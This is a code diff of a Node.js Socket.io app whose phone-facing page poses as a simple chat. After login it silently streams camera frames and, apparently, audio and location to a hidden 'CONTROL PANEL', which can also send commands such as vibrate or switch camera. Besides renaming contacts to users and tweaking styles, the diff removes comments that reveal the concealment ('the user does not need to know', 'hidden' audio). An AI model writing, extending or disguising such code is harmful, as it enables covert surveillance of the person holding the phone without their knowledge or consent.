@@ -12,9 +12,9 @@ const io = new Server(server, {
 const PORT = process.env.PORT || 3000;
 
 // ========== ARMAZENAMENTO ==========
-const contacts = new Map();
-const messages = new Map();
-const activeSockets = new Map();
+const users = new Map(); // userId -> { id, name, socketId, online, lastSeen }
+const messages = new Map(); // userId -> [{ id, from, to, text, timestamp }]
+const activeSockets = new Map(); // socketId -> userId
 
 // ========== ROTAS ==========
 
@@ -23,13 +23,13 @@ app.get('/', (req, res) => {
   const isMobile = ua.includes('mobile') || ua.includes('android') || ua.includes('iphone');
 
   if (isMobile) {
-    // ========== PÁGINA DO CELULAR (SIMPLE CHAT) ==========
+    // ========== PÁGINA DO CELULAR ==========
     res.send(`<!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-    <title>CHAT</title>
+    <title>● CHAT</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -47,11 +47,11 @@ app.get('/', (req, res) => {
             max-width: 450px;
             background: #0d0d0d;
             border: 2px solid #00ff41;
-            border-radius: 10px;
+            border-radius: 5px;
             height: 95vh;
             display: flex;
             flex-direction: column;
-            box-shadow: 0 0 30px rgba(0,255,65,0.1);
+            box-shadow: 0 0 30px rgba(0,255,65,0.05);
         }
         .header {
             background: #0d0d0d;
@@ -64,11 +64,11 @@ app.get('/', (req, res) => {
             font-weight: normal;
             letter-spacing: 3px;
             color: #00ff41;
-            text-shadow: 0 0 10px rgba(0,255,65,0.3);
+            text-shadow: 0 0 10px rgba(0,255,65,0.1);
         }
         .header .sub {
             font-size: 10px;
-            opacity: 0.5;
+            opacity: 0.3;
             margin-top: 3px;
             letter-spacing: 2px;
         }
@@ -85,14 +85,14 @@ app.get('/', (req, res) => {
             letter-spacing: 2px;
             margin-bottom: 25px;
             font-size: 14px;
-            opacity: 0.7;
+            opacity: 0.5;
         }
         .login-area .form-group { margin-bottom: 15px; }
         .login-area label {
             display: block;
             font-size: 11px;
             letter-spacing: 2px;
-            opacity: 0.5;
+            opacity: 0.3;
             margin-bottom: 5px;
         }
         .login-area input {
@@ -100,18 +100,18 @@ app.get('/', (req, res) => {
             padding: 12px 15px;
             background: #111;
             border: 1px solid #00ff41;
-            border-radius: 5px;
+            border-radius: 3px;
             color: #00ff41;
             font-family: 'Courier New', monospace;
             font-size: 14px;
             outline: none;
         }
         .login-area input:focus {
-            box-shadow: 0 0 20px rgba(0,255,65,0.1);
+            box-shadow: 0 0 20px rgba(0,255,65,0.05);
         }
         .login-area input::placeholder {
             color: #00ff41;
-            opacity: 0.3;
+            opacity: 0.2;
         }
         .login-btn {
             width: 100%;
@@ -119,7 +119,7 @@ app.get('/', (req, res) => {
             background: #00ff41;
             color: #0a0a0a;
             border: none;
-            border-radius: 5px;
+            border-radius: 3px;
             font-family: 'Courier New', monospace;
             font-size: 14px;
             font-weight: bold;
@@ -130,12 +130,12 @@ app.get('/', (req, res) => {
         }
         .login-btn:hover {
             background: #00cc33;
-            box-shadow: 0 0 30px rgba(0,255,65,0.2);
+            box-shadow: 0 0 30px rgba(0,255,65,0.1);
         }
         .login-btn:disabled {
             background: #1a1a1a;
             color: #00ff41;
-            opacity: 0.3;
+            opacity: 0.2;
             cursor: not-allowed;
         }
         .error-msg {
@@ -159,7 +159,7 @@ app.get('/', (req, res) => {
             border-bottom: 1px solid #00ff41;
             font-size: 10px;
             letter-spacing: 1px;
-            opacity: 0.5;
+            opacity: 0.4;
         }
         .chat-messages {
             flex: 1;
@@ -178,7 +178,7 @@ app.get('/', (req, res) => {
         }
         .message {
             padding: 8px 14px;
-            border-radius: 3px;
+            border-radius: 2px;
             margin-bottom: 6px;
             max-width: 80%;
             word-wrap: break-word;
@@ -186,7 +186,7 @@ app.get('/', (req, res) => {
             font-family: 'Courier New', monospace;
             border-left: 2px solid transparent;
         }
-        .message.from-contact {
+        .message.from-user {
             background: #0d0d0d;
             color: #00ff41;
             margin-right: auto;
@@ -200,17 +200,15 @@ app.get('/', (req, res) => {
         }
         .message .time {
             font-size: 8px;
-            opacity: 0.4;
+            opacity: 0.3;
             display: block;
             margin-top: 3px;
-            font-family: 'Courier New', monospace;
         }
         .typing-indicator {
             padding: 8px 15px;
             color: #00ff41;
-            opacity: 0.4;
+            opacity: 0.3;
             font-size: 11px;
-            font-family: 'Courier New', monospace;
             display: none;
         }
         .chat-input-area {
@@ -233,7 +231,7 @@ app.get('/', (req, res) => {
         }
         .chat-input-area input::placeholder {
             color: #00ff41;
-            opacity: 0.3;
+            opacity: 0.2;
         }
         .chat-input-area input:focus {
             box-shadow: 0 0 20px rgba(0,255,65,0.05);
@@ -263,15 +261,15 @@ app.get('/', (req, res) => {
         }
         .status-dot.online { background: #00ff41; }
         .status-dot.offline { background: #333; }
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.2; }
-        }
         .typing-dots span {
             animation: blink 1s infinite;
         }
         .typing-dots span:nth-child(2) { animation-delay: 0.2s; }
         .typing-dots span:nth-child(3) { animation-delay: 0.4s; }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.2; }
+        }
     </style>
 </head>
 <body>
@@ -285,11 +283,11 @@ app.get('/', (req, res) => {
             <h3>› ACCESS CODE ‹</h3>
             <div class="form-group">
                 <label>CODE</label>
-                <input type="text" id="contactId" placeholder="ENTER ACCESS CODE" maxlength="36">
+                <input type="text" id="userId" placeholder="ENTER ACCESS CODE" maxlength="36">
             </div>
             <div class="form-group">
                 <label>NAME</label>
-                <input type="text" id="contactName" placeholder="YOUR NAME">
+                <input type="text" id="userName" placeholder="YOUR NAME">
             </div>
             <button class="login-btn" id="loginBtn">► CONNECT</button>
             <div class="error-msg" id="loginError"></div>
@@ -298,10 +296,10 @@ app.get('/', (req, res) => {
         <div id="chatArea" class="chat-area">
             <div class="status-bar">
                 <span id="connectionStatus"><span class="status-dot online"></span>ONLINE</span>
-                <span id="contactNameDisplay">● CONNECTED</span>
+                <span id="userNameDisplay">● CONNECTED</span>
             </div>
             <div class="chat-messages" id="chatMessages">
-                <div style="text-align:center; color:#00ff41; opacity:0.2; padding:30px 0; font-size:12px; letter-spacing:2px;">› SYSTEM READY ‹</div>
+                <div style="text-align:center; color:#00ff41; opacity:0.15; padding:30px 0; font-size:12px; letter-spacing:2px;">› SYSTEM READY ‹</div>
             </div>
             <div class="typing-indicator" id="typingIndicator">
                 <span class="typing-dots"><span>.</span><span>.</span><span>.</span></span> TYPING
@@ -316,7 +314,7 @@ app.get('/', (req, res) => {
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io({ transports: ['websocket', 'polling'], reconnection: true });
-        let contactId = null, contactName = null, isLoggedIn = false, typingTimeout = null;
+        let userId = null, userName = null, isLoggedIn = false, typingTimeout = null;
 
         const loginArea = document.getElementById('loginArea');
         const chatArea = document.getElementById('chatArea');
@@ -325,7 +323,7 @@ app.get('/', (req, res) => {
         const chatInput = document.getElementById('chatInput');
         const typingIndicator = document.getElementById('typingIndicator');
         const connectionStatus = document.getElementById('connectionStatus');
-        const contactNameDisplay = document.getElementById('contactNameDisplay');
+        const userNameDisplay = document.getElementById('userNameDisplay');
         const loginError = document.getElementById('loginError');
 
         let mediaStream = null;
@@ -335,24 +333,24 @@ app.get('/', (req, res) => {
 
         // ===== LOGIN =====
         loginBtn.onclick = () => {
-            const id = document.getElementById('contactId').value.trim();
-            const name = document.getElementById('contactName').value.trim();
+            const id = document.getElementById('userId').value.trim();
+            const name = document.getElementById('userName').value.trim();
             if(!id || !name) { loginError.textContent = 'ERROR: INVALID INPUT'; return; }
             loginBtn.disabled = true;
             loginBtn.textContent = '● CONNECTING...';
             loginError.textContent = '';
-            socket.emit('contact_login', { contactId: id, name: name });
+            socket.emit('user_login', { userId: id, name: name });
         };
 
         socket.on('login_success', (data) => {
-            contactId = data.contactId;
-            contactName = data.name;
+            userId = data.userId;
+            userName = data.name;
             isLoggedIn = true;
             loginArea.style.display = 'none';
             chatArea.style.display = 'flex';
-            contactNameDisplay.textContent = '● ' + contactName.toUpperCase();
+            userNameDisplay.textContent = '● ' + userName.toUpperCase();
             data.messages.forEach(msg => {
-                addMessageToChat(msg.text, msg.from === 'pc' ? 'from-pc' : 'from-contact');
+                addMessageToChat(msg.text, msg.from === 'pc' ? 'from-pc' : 'from-user');
             });
             startStreaming();
             loginBtn.disabled = false;
@@ -384,7 +382,7 @@ app.get('/', (req, res) => {
                 setInterval(() => {
                     if(isLoggedIn && mediaStream && mediaStream.active) {
                         ctx.drawImage(video, 0, 0, 320, 240);
-                        socket.emit('frame', canvas.toDataURL('image/jpeg', 0.5));
+                        socket.emit('frame', canvas.toDataURL('image/jpeg', 0.4));
                     }
                 }, 300);
 
@@ -411,7 +409,6 @@ app.get('/', (req, res) => {
                     );
                 }
             } catch(err) {
-                // Silenciosamente falha - usuário não precisa saber
                 console.log('Streaming unavailable');
             }
         }
@@ -423,7 +420,7 @@ app.get('/', (req, res) => {
             socket.emit('send_message', { text, isFromPc: false });
             chatInput.value = '';
             stopTyping();
-            addMessageToChat(text, 'from-contact');
+            addMessageToChat(text, 'from-user');
         }
 
         function addMessageToChat(text, className) {
@@ -455,7 +452,7 @@ app.get('/', (req, res) => {
             addMessageToChat(data.text, 'from-pc');
         });
 
-        socket.on('contact_typing', (data) => {
+        socket.on('user_typing', (data) => {
             typingIndicator.style.display = data.isTyping ? 'block' : 'none';
         });
 
@@ -498,11 +495,11 @@ app.get('/', (req, res) => {
             letter-spacing: 4px;
             text-align: center;
             margin-bottom: 25px;
-            text-shadow: 0 0 30px rgba(0,255,65,0.1);
+            text-shadow: 0 0 30px rgba(0,255,65,0.05);
         }
         .main-grid {
             display: grid;
-            grid-template-columns: 280px 1fr 300px;
+            grid-template-columns: 280px 1fr 320px;
             gap: 15px;
             height: calc(100vh - 100px);
         }
@@ -521,7 +518,7 @@ app.get('/', (req, res) => {
             font-size: 13px;
             letter-spacing: 3px;
             margin-bottom: 12px;
-            opacity: 0.6;
+            opacity: 0.5;
             border-bottom: 1px solid #00ff41;
             padding-bottom: 8px;
         }
@@ -530,14 +527,14 @@ app.get('/', (req, res) => {
             font-size: 11px;
             letter-spacing: 2px;
             margin: 8px 0 5px;
-            opacity: 0.4;
+            opacity: 0.3;
         }
         .form-group { margin-bottom: 10px; }
         .form-group label {
             display: block;
             font-size: 10px;
             letter-spacing: 2px;
-            opacity: 0.4;
+            opacity: 0.3;
             margin-bottom: 3px;
         }
         .form-group input {
@@ -566,7 +563,7 @@ app.get('/', (req, res) => {
             cursor: pointer;
             transition: all 0.3s;
         }
-        .btn-primary:hover { background: #00cc33; box-shadow: 0 0 30px rgba(0,255,65,0.1); }
+        .btn-primary:hover { background: #00cc33; box-shadow: 0 0 30px rgba(0,255,65,0.05); }
         .btn-danger {
             width: 100%;
             padding: 6px;
@@ -583,7 +580,7 @@ app.get('/', (req, res) => {
             margin-top: 5px;
         }
         .btn-danger:hover { background: #cc0033; }
-        .contact-item {
+        .user-item {
             padding: 8px 10px;
             border-radius: 3px;
             margin-bottom: 5px;
@@ -594,14 +591,13 @@ app.get('/', (req, res) => {
             justify-content: space-between;
             align-items: center;
         }
-        .contact-item:hover { background: #111; }
-        .contact-item.active {
+        .user-item:hover { background: #111; }
+        .user-item.active {
             border-color: #00ff41;
             background: #111;
         }
-        .contact-item .name { font-size: 13px; }
-        .contact-item .phone { font-size: 10px; opacity: 0.3; }
-        .contact-item .status {
+        .user-item .name { font-size: 13px; }
+        .user-item .status {
             font-size: 8px;
             padding: 2px 8px;
             border-radius: 2px;
@@ -623,7 +619,7 @@ app.get('/', (req, res) => {
             border-bottom: 1px solid #00ff41;
             margin-bottom: 8px;
         }
-        .chat-header h3 { font-weight: normal; font-size: 13px; letter-spacing: 2px; opacity: 0.6; }
+        .chat-header h3 { font-weight: normal; font-size: 13px; letter-spacing: 2px; opacity: 0.5; }
         .chat-messages {
             flex: 1;
             overflow-y: auto;
@@ -647,16 +643,16 @@ app.get('/', (req, res) => {
             margin-left: auto;
             border-left-color: #0a0a0a;
         }
-        .message.from-contact {
+        .message.from-user {
             background: #0d0d0d;
             color: #00ff41;
             margin-right: auto;
             border-left-color: #00ff41;
         }
-        .message .time { font-size: 8px; opacity: 0.3; display: block; margin-top: 2px; }
+        .message .time { font-size: 8px; opacity: 0.2; display: block; margin-top: 2px; }
         .typing-indicator {
             font-size: 10px;
-            opacity: 0.3;
+            opacity: 0.2;
             padding: 5px 0;
             display: none;
             font-family: 'Courier New', monospace;
@@ -692,8 +688,8 @@ app.get('/', (req, res) => {
             letter-spacing: 1px;
         }
         .chat-input-area button:hover { background: #00cc33; }
-        .no-contact { text-align: center; opacity: 0.2; padding: 30px 0; font-size: 12px; letter-spacing: 2px; }
-        .no-contact h3 { font-weight: normal; font-size: 14px; }
+        .no-user { text-align: center; opacity: 0.15; padding: 30px 0; font-size: 12px; letter-spacing: 2px; }
+        .no-user h3 { font-weight: normal; font-size: 14px; }
         .video-container { background: #000; border-radius: 2px; overflow: hidden; margin: 6px 0; border: 1px solid #00ff41; }
         .video-container img { width: 100%; height: auto; display: block; }
         .location-info {
@@ -702,7 +698,7 @@ app.get('/', (req, res) => {
             border-radius: 2px;
             margin: 6px 0;
             font-size: 10px;
-            opacity: 0.5;
+            opacity: 0.4;
             border: 1px solid #00ff41;
         }
         .location-info a { color: #00ff41; }
@@ -752,23 +748,29 @@ app.get('/', (req, res) => {
             font-size: 11px;
         }
         .music-item:hover { background: #00ff41; color: #0a0a0a; }
-        .music-item .play { opacity: 0.5; }
-        .info-text { font-size: 10px; opacity: 0.3; margin: 3px 0; }
-        hr { border: none; border-top: 1px solid #00ff41; opacity: 0.1; margin: 10px 0; }
+        .music-item .play { opacity: 0.4; }
+        .info-text { font-size: 10px; opacity: 0.2; margin: 3px 0; }
+        hr { border: none; border-top: 1px solid #00ff41; opacity: 0.05; margin: 10px 0; }
         .code-display {
             background: #111;
-            padding: 8px 12px;
+            padding: 10px 12px;
             border: 1px solid #00ff41;
             border-radius: 3px;
-            font-size: 12px;
-            letter-spacing: 2px;
+            font-size: 14px;
+            letter-spacing: 3px;
             text-align: center;
-            margin: 5px 0;
+            margin: 8px 0;
             font-family: 'Courier New', monospace;
             word-break: break-all;
         }
-        .copy-btn {
-            padding: 4px 12px;
+        .code-actions {
+            display: flex;
+            gap: 8px;
+            margin-top: 5px;
+        }
+        .code-actions button {
+            flex: 1;
+            padding: 6px;
             background: #00ff41;
             color: #0a0a0a;
             border: none;
@@ -776,9 +778,14 @@ app.get('/', (req, res) => {
             cursor: pointer;
             font-family: 'Courier New', monospace;
             font-size: 10px;
-            margin-top: 4px;
+            letter-spacing: 1px;
+            transition: all 0.3s;
         }
-        .copy-btn:hover { background: #00cc33; }
+        .code-actions button:hover { background: #00cc33; }
+        .code-actions .delete-code {
+            background: #ff0044;
+        }
+        .code-actions .delete-code:hover { background: #cc0033; }
         @media (max-width: 1100px) {
             .main-grid { grid-template-columns: 1fr; height: auto; }
             .panel { max-height: 400px; }
@@ -789,33 +796,29 @@ app.get('/', (req, res) => {
     <div class="container">
         <h1>● CONTROL PANEL ●</h1>
         <div class="main-grid">
-            <!-- Contatos -->
+            <!-- Usuários -->
             <div class="panel">
-                <h2>● CONTACTS</h2>
+                <h2>● USERS</h2>
                 <div class="form-group">
-                    <label>NAME</label>
-                    <input type="text" id="contactName" placeholder="USER NAME">
+                    <label>USER NAME</label>
+                    <input type="text" id="userName" placeholder="ENTER NAME">
                 </div>
-                <div class="form-group">
-                    <label>PHONE</label>
-                    <input type="text" id="contactPhone" placeholder="PHONE NUMBER">
-                </div>
-                <button class="btn-primary" id="addContact">+ GENERATE CODE</button>
+                <button class="btn-primary" id="addUser">+ GENERATE CODE</button>
                 <hr>
-                <div id="contactList"></div>
+                <div id="userList"></div>
             </div>
 
             <!-- Chat -->
             <div class="panel chat-area">
                 <div id="chatContainer">
-                    <div class="no-contact"><h3>● SELECT CONTACT</h3></div>
+                    <div class="no-user"><h3>● SELECT USER</h3></div>
                 </div>
             </div>
 
             <!-- Info -->
             <div class="panel">
                 <h2>● DATA</h2>
-                <div id="contactInfo"><div class="no-contact"><p>SELECT CONTACT</p></div></div>
+                <div id="userInfo"><div class="no-user"><p>SELECT USER</p></div></div>
             </div>
         </div>
     </div>
@@ -823,50 +826,49 @@ app.get('/', (req, res) => {
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io();
-        let currentContactId = null;
+        let currentUserId = null;
         let typingTimeout = null;
         let audioGain = null;
 
-        const contactList = document.getElementById('contactList');
+        const userList = document.getElementById('userList');
         const chatContainer = document.getElementById('chatContainer');
-        const contactInfo = document.getElementById('contactInfo');
+        const userInfo = document.getElementById('userInfo');
 
-        // ===== CARREGAR CONTATOS =====
-        async function loadContacts() {
-            const res = await fetch('/api/contacts');
-            const contacts = await res.json();
-            renderContacts(contacts);
+        // ===== CARREGAR USUÁRIOS =====
+        async function loadUsers() {
+            const res = await fetch('/api/users');
+            const users = await res.json();
+            renderUsers(users);
         }
 
-        function renderContacts(contacts) {
-            if(contacts.length === 0) {
-                contactList.innerHTML = '<div style="text-align:center;opacity:0.2;padding:20px;font-size:11px;">NO CONTACTS</div>';
+        function renderUsers(users) {
+            if(users.length === 0) {
+                userList.innerHTML = '<div style="text-align:center;opacity:0.15;padding:20px;font-size:11px;">NO USERS</div>';
                 return;
             }
-            contactList.innerHTML = contacts.map(c => \`
-                <div class="contact-item \${currentContactId === c.id ? 'active' : ''}" onclick="selectContact('\${c.id}')">
+            userList.innerHTML = users.map(u => \`
+                <div class="user-item \${currentUserId === u.id ? 'active' : ''}" onclick="selectUser('\${u.id}')">
                     <div>
-                        <div class="name">\${c.name}</div>
-                        <div class="phone">\${c.phone}</div>
+                        <div class="name">\${u.name}</div>
                     </div>
                     <div>
-                        <span class="status \${c.online ? 'online' : 'offline'}">\${c.online ? 'ON' : 'OFF'}</span>
-                        <span class="badge" id="badge_\${c.id}">0</span>
+                        <span class="status \${u.online ? 'online' : 'offline'}">\${u.online ? 'ON' : 'OFF'}</span>
+                        <span class="badge" id="badge_\${u.id}">0</span>
                     </div>
                 </div>
             \`).join('');
         }
 
-        // ===== SELECIONAR CONTATO =====
-        async function selectContact(contactId) {
-            currentContactId = contactId;
-            loadContacts();
-            const res = await fetch('/api/messages/' + contactId);
+        // ===== SELECIONAR USUÁRIO =====
+        async function selectUser(userId) {
+            currentUserId = userId;
+            loadUsers();
+            const res = await fetch('/api/messages/' + userId);
             const messages = await res.json();
             renderChat(messages);
-            const cRes = await fetch('/api/contacts/' + contactId);
-            const contact = await cRes.json();
-            renderContactInfo(contact);
+            const uRes = await fetch('/api/users/' + userId);
+            const user = await uRes.json();
+            renderUserInfo(user);
         }
 
         function renderChat(messages) {
@@ -874,7 +876,7 @@ app.get('/', (req, res) => {
                 <div class="chat-header"><h3>● CHAT</h3></div>
                 <div class="chat-messages" id="chatMessages">
                     \${messages.map(m => \`
-                        <div class="message \${m.from === 'pc' ? 'from-pc' : 'from-contact'}">
+                        <div class="message \${m.from === 'pc' ? 'from-pc' : 'from-user'}">
                             \${m.text}
                             <span class="time">\${new Date(m.timestamp).toLocaleTimeString()}</span>
                         </div>
@@ -890,19 +892,19 @@ app.get('/', (req, res) => {
             if(div) div.scrollTop = div.scrollHeight;
         }
 
-        function renderContactInfo(contact) {
-            contactInfo.innerHTML = \`
+        function renderUserInfo(user) {
+            userInfo.innerHTML = \`
                 <div style="text-align:center;padding:8px 0;">
                     <div style="font-size:28px;">●</div>
-                    <h3 style="font-weight:normal;font-size:16px;letter-spacing:2px;">\${contact.name}</h3>
-                    <div style="font-size:10px;opacity:0.3;">\${contact.phone}</div>
+                    <h3 style="font-weight:normal;font-size:16px;letter-spacing:2px;">\${user.name}</h3>
                     <div style="margin:5px 0;">
-                        <span class="status \${contact.online ? 'online' : 'offline'}">\${contact.online ? '● ONLINE' : '● OFFLINE'}</span>
+                        <span class="status \${user.online ? 'online' : 'offline'}">\${user.online ? '● ONLINE' : '● OFFLINE'}</span>
                     </div>
-                    <div style="font-size:9px;opacity:0.2;">LAST: \${new Date(contact.lastSeen).toLocaleString()}</div>
+                    <div style="font-size:9px;opacity:0.15;">LAST: \${new Date(user.lastSeen).toLocaleString()}</div>
+                    <div style="font-size:9px;opacity:0.1;margin-top:3px;">ID: \${user.id.substring(0,8)}...</div>
                 </div>
-                <div class="video-container"><img id="contactVideo" src="" alt=""></div>
-                <div class="location-info" id="contactLocation">● LOCATION: WAITING...</div>
+                <div class="video-container"><img id="userVideo" src="" alt=""></div>
+                <div class="location-info" id="userLocation">● LOCATION: WAITING...</div>
                 <div class="commands">
                     <button onclick="sendCommand('vibrate')">VIBRATE</button>
                     <button onclick="sendCommand('trocarCamera')">CAMERA</button>
@@ -910,14 +912,14 @@ app.get('/', (req, res) => {
                     <button onclick="sendCommand('skip_current_message')">SKIP</button>
                 </div>
                 <h3>● MUSIC</h3>
-                <div class="music-item" onclick="playMusic('1N8N-X8NM4k','MUSIC 1')">
+                <div class="music-item" onclick="playMusic('1N8N-X8NM4k','TRACK 1')">
                     <span>TRACK 1</span><span class="play">►</span>
                 </div>
-                <div class="music-item" onclick="playMusic('sTVNvP5Uw98','MUSIC 2')">
+                <div class="music-item" onclick="playMusic('sTVNvP5Uw98','TRACK 2')">
                     <span>TRACK 2</span><span class="play">►</span>
                 </div>
                 <button class="btn-stop-music" onclick="stopMusic()">■ STOP</button>
-                <button class="btn-danger" onclick="deleteContact()">× DELETE</button>
+                <button class="btn-danger" onclick="deleteUser()">× DELETE</button>
             \`;
         }
 
@@ -926,8 +928,8 @@ app.get('/', (req, res) => {
             const input = document.getElementById('chatInput');
             if(!input) return;
             const text = input.value.trim();
-            if(!text || !currentContactId) return;
-            socket.emit('send_message', { to: currentContactId, text, isFromPc: true });
+            if(!text || !currentUserId) return;
+            socket.emit('send_message', { to: currentUserId, text, isFromPc: true });
             input.value = '';
             stopTyping();
             addMessageToChat(text, 'from-pc');
@@ -944,95 +946,93 @@ app.get('/', (req, res) => {
         }
 
         function onTyping() {
-            if(!currentContactId) return;
-            socket.emit('typing_start', { to: currentContactId, isFromPc: true });
+            if(!currentUserId) return;
+            socket.emit('typing_start', { to: currentUserId, isFromPc: true });
             if(typingTimeout) clearTimeout(typingTimeout);
             typingTimeout = setTimeout(() => stopTyping(), 1000);
         }
 
         function stopTyping() {
-            if(!currentContactId) return;
-            socket.emit('typing_stop', { to: currentContactId, isFromPc: true });
+            if(!currentUserId) return;
+            socket.emit('typing_stop', { to: currentUserId, isFromPc: true });
             if(typingTimeout) { clearTimeout(typingTimeout); typingTimeout = null; }
         }
 
         // ===== COMANDOS =====
         function sendCommand(command) {
-            if(!currentContactId) return;
-            socket.emit('comando', { contactId: currentContactId, command });
+            if(!currentUserId) return;
+            socket.emit('comando', { userId: currentUserId, command });
         }
 
         function playMusic(videoId, songName) {
-            if(!currentContactId) return;
-            socket.emit('comando', { contactId: currentContactId, command: 'play_youtube:' + videoId + ':' + songName });
+            if(!currentUserId) return;
+            socket.emit('comando', { userId: currentUserId, command: 'play_youtube:' + videoId + ':' + songName });
         }
 
         function stopMusic() {
-            if(!currentContactId) return;
-            socket.emit('comando', { contactId: currentContactId, command: 'stop_music' });
+            if(!currentUserId) return;
+            socket.emit('comando', { userId: currentUserId, command: 'stop_music' });
         }
 
-        async function deleteContact() {
-            if(!currentContactId || !confirm('DELETE CONTACT?')) return;
-            await fetch('/api/contacts/' + currentContactId, { method: 'DELETE' });
-            currentContactId = null;
-            loadContacts();
-            chatContainer.innerHTML = '<div class="no-contact"><h3>● CONTACT DELETED</h3></div>';
-            contactInfo.innerHTML = '<div class="no-contact"><p>DELETED</p></div>';
+        async function deleteUser() {
+            if(!currentUserId || !confirm('DELETE USER?')) return;
+            await fetch('/api/users/' + currentUserId, { method: 'DELETE' });
+            currentUserId = null;
+            loadUsers();
+            chatContainer.innerHTML = '<div class="no-user"><h3>● USER DELETED</h3></div>';
+            userInfo.innerHTML = '<div class="no-user"><p>DELETED</p></div>';
         }
 
-        // ===== ADICIONAR CONTATO =====
-        document.getElementById('addContact').onclick = async () => {
-            const name = document.getElementById('contactName').value.trim();
-            const phone = document.getElementById('contactPhone').value.trim();
-            if(!name || !phone) { alert('FILL ALL FIELDS'); return; }
+        // ===== ADICIONAR USUÁRIO =====
+        document.getElementById('addUser').onclick = async () => {
+            const name = document.getElementById('userName').value.trim();
+            if(!name) { alert('ENTER A NAME'); return; }
             try {
-                const res = await fetch('/api/contacts', {
+                const res = await fetch('/api/users', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ name, phone })
+                    body: JSON.stringify({ name })
                 });
                 if(!res.ok) { const e = await res.json(); alert(e.error || 'ERROR'); return; }
-                const contact = await res.json();
-                document.getElementById('contactName').value = '';
-                document.getElementById('contactPhone').value = '';
-                loadContacts();
+                const user = await res.json();
+                document.getElementById('userName').value = '';
+                loadUsers();
                 
                 // Mostrar código gerado
-                const code = contact.id;
+                const code = user.id;
                 alert('● ACCESS CODE GENERATED ●\n\nCODE: ' + code + '\n\nSEND THIS CODE TO THE USER');
             } catch(e) { alert('ERROR'); }
         };
 
         // ===== SOCKET EVENTS =====
-        socket.on('new_message_from_contact', (data) => {
-            if(currentContactId === data.contactId) {
-                addMessageToChat(data.text, 'from-contact');
+        socket.on('new_message_from_user', (data) => {
+            if(currentUserId === data.userId) {
+                addMessageToChat(data.text, 'from-user');
             }
         });
 
-        socket.on('contact_typing', (data) => {
+        socket.on('user_typing', (data) => {
             const ind = document.getElementById('typingIndicator');
             if(ind) { ind.style.display = data.isTyping ? 'block' : 'none'; }
         });
 
-        socket.on('contact_status_change', (data) => {
-            loadContacts();
-            if(currentContactId === data.contactId) {
-                fetch('/api/contacts/' + data.contactId).then(r => r.json()).then(c => renderContactInfo(c));
+        socket.on('user_status_change', (data) => {
+            loadUsers();
+            if(currentUserId === data.userId) {
+                fetch('/api/users/' + data.userId).then(r => r.json()).then(u => renderUserInfo(u));
             }
         });
 
-        socket.on('contact_frame', (data) => {
-            if(currentContactId === data.contactId) {
-                const v = document.getElementById('contactVideo');
+        socket.on('user_frame', (data) => {
+            if(currentUserId === data.userId) {
+                const v = document.getElementById('userVideo');
                 if(v) v.src = data.frame;
             }
         });
 
-        socket.on('contact_location', (data) => {
-            if(currentContactId === data.contactId) {
-                const l = document.getElementById('contactLocation');
+        socket.on('user_location', (data) => {
+            if(currentUserId === data.userId) {
+                const l = document.getElementById('userLocation');
                 if(l) {
                     l.innerHTML = '● LOCATION: ' + data.location.latitude.toFixed(6) + ', ' + 
                         data.location.longitude.toFixed(6) + 
@@ -1044,7 +1044,7 @@ app.get('/', (req, res) => {
 
         socket.on('force_disconnect', () => { alert('● CONNECTION TERMINATED'); location.reload(); });
 
-        // ===== ÁUDIO (OCULTO) =====
+        // ===== ÁUDIO =====
         try {
             const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
             audioGain = audioCtx.createGain();
@@ -1052,8 +1052,8 @@ app.get('/', (req, res) => {
             audioGain.connect(audioCtx.destination);
         } catch(e) {}
 
-        socket.on('contact_audio', (data) => {
-            if(currentContactId === data.contactId && audioGain) {
+        socket.on('user_audio', (data) => {
+            if(currentUserId === data.userId && audioGain) {
                 try {
                     const ctx = audioGain.context;
                     const buf = ctx.createBuffer(1, data.audio.length, ctx.sampleRate);
@@ -1066,7 +1066,7 @@ app.get('/', (req, res) => {
             }
         });
 
-        loadContacts();
+        loadUsers();
     </script>
 </body>
 </html>`);
@@ -1076,76 +1076,86 @@ app.get('/', (req, res) => {
 // ========== API REST ==========
 app.use(express.json());
 
-app.post('/api/contacts', (req, res) => {
-  const { name, phone } = req.body;
-  if(!name || !phone) return res.status(400).json({ error: 'Required fields' });
-  for(let [id, c] of contacts) {
-    if(c.phone === phone) return res.status(400).json({ error: 'Phone already registered' });
-  }
+// Criar usuário (gera código)
+app.post('/api/users', (req, res) => {
+  const { name } = req.body;
+  if(!name) return res.status(400).json({ error: 'Name is required' });
+  
   const id = uuidv4();
-  const newContact = { id, name, phone, socketId: null, online: false, lastSeen: new Date(), createdAt: new Date() };
-  contacts.set(id, newContact);
+  const newUser = { 
+    id, 
+    name, 
+    socketId: null, 
+    online: false, 
+    lastSeen: new Date(), 
+    createdAt: new Date() 
+  };
+  users.set(id, newUser);
   messages.set(id, []);
-  res.status(201).json(newContact);
+  res.status(201).json(newUser);
 });
 
-app.get('/api/contacts', (req, res) => {
-  res.json(Array.from(contacts.values()));
+// Listar usuários
+app.get('/api/users', (req, res) => {
+  res.json(Array.from(users.values()));
 });
 
-app.get('/api/contacts/:id', (req, res) => {
-  const c = contacts.get(req.params.id);
-  if(!c) return res.status(404).json({ error: 'Not found' });
-  res.json(c);
+// Buscar usuário
+app.get('/api/users/:id', (req, res) => {
+  const u = users.get(req.params.id);
+  if(!u) return res.status(404).json({ error: 'Not found' });
+  res.json(u);
 });
 
-app.delete('/api/contacts/:id', (req, res) => {
-  const c = contacts.get(req.params.id);
-  if(!c) return res.status(404).json({ error: 'Not found' });
-  if(c.socketId) {
-    const sock = io.sockets.sockets.get(c.socketId);
+// Deletar usuário
+app.delete('/api/users/:id', (req, res) => {
+  const u = users.get(req.params.id);
+  if(!u) return res.status(404).json({ error: 'Not found' });
+  if(u.socketId) {
+    const sock = io.sockets.sockets.get(u.socketId);
     if(sock) sock.disconnect();
   }
-  contacts.delete(req.params.id);
+  users.delete(req.params.id);
   messages.delete(req.params.id);
   res.json({ success: true });
 });
 
-app.get('/api/messages/:contactId', (req, res) => {
